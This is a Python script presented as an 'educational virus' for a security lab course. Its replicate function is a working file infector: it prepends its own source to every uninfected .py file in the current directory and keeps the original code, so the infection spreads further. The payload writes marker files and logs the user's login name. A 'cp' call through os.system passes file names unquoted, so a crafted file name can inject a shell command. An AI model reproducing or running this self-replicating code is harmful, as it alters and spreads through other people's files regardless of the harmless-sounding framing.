#!/usr/bin/env python3
"""
Educational Virus - DO NOT RUN ON REAL SYSTEMS
This is for academic purposes only
"""

import os
import sys
import time

# Virus signature - what antivirus will look for
VIRUS_SIGNATURE = "VIRUS_SIGNATURE:EDU-2024-LEGIT"

def display_message():
    """Harmless educational message"""
    message = """
    ⚠️  EDUCATIONAL VIRUS SIMULATION ⚠️
    
    This is a harmless educational program demonstrating 
    how viruses replicate. No real damage is done.
    
    Features demonstrated:
    1. Self-replication to other .py files
    2. Payload execution
    3. File system interaction
    
    Created for: Computer Security Lab Project
    """
    print(message)

def replicate():
    """Copy virus code to other Python files in same directory"""
    try:
        # Get current virus code
        with open(__file__, 'r') as virus_file:
            virus_code = virus_file.readlines()
        
        # Find all Python files in current directory
        for filename in os.listdir('.'):
            if filename.endswith('.py') and filename != os.path.basename(__file__):
                
                # Check if already infected
                with open(filename, 'r') as target_file:
                    content = target_file.read()
                
                if VIRUS_SIGNATURE not in content:
                    print(f"[+] Infecting: {filename}")
                    
                    # Backup original file
                    backup_name = filename + ".backup"
                    os.system(f"cp {filename} {backup_name}")
                    
                    # Add virus to target file
                    with open(filename, 'w') as target_file:
                        target_file.write(f'#{VIRUS_SIGNATURE}\n')
                        target_file.write('# INFECTED - Educational Purpose\n')
                        target_file.writelines(virus_code)
                        target_file.write('\n')
                    
                    # Restore original functionality by appending backup
                    with open(backup_name, 'r') as backup_file:
                        original_code = backup_file.read()
                    
                    with open(filename, 'a') as target_file:
                        target_file.write("\n# Original code below:\n")
                        target_file.write(original_code)
                    
                    os.remove(backup_name)
    
    except Exception as e:
        print(f"[-] Replication error: {e}")

def payload():
    """Harmless payload - creates educational files"""
    print("[+] Executing payload...")
    
    # Create harmless marker files
    files_to_create = [
        ("virus_was_here.txt", "This file was created by an educational virus simulation.\nNo real damage was done.\nTimestamp: " + time.ctime()),
        ("educational_payload.txt", "This demonstrates how viruses can create files.\nAlways practice ethical hacking!\n"),
        ("README_SECURITY.txt", "This is a security lab exercise.\nAll activities are for educational purposes only.\n")
    ]
    
    for filename, content in files_to_create:
        with open(filename, 'w') as f:
            f.write(content)
        print(f"  Created: {filename}")
    
    # Create a simple log
    with open("virus_log.txt", 'a') as log:
        log.write(f"Virus executed at: {time.ctime()}\n")
        log.write(f"User: {os.getlogin()}\n")
        log.write("Action: Created educational files\n\n")

def main():
    """Main virus execution"""
    print("\n" + "="*50)
    display_message()
    print("[*] Starting virus simulation...")
    replicate()
    payload()
    print("[*] Simulation complete!")
    print("[*] Check created files for 'payload' demonstration")
    print("="*50 + "\n")

if __name__ == "__main__":
    main()
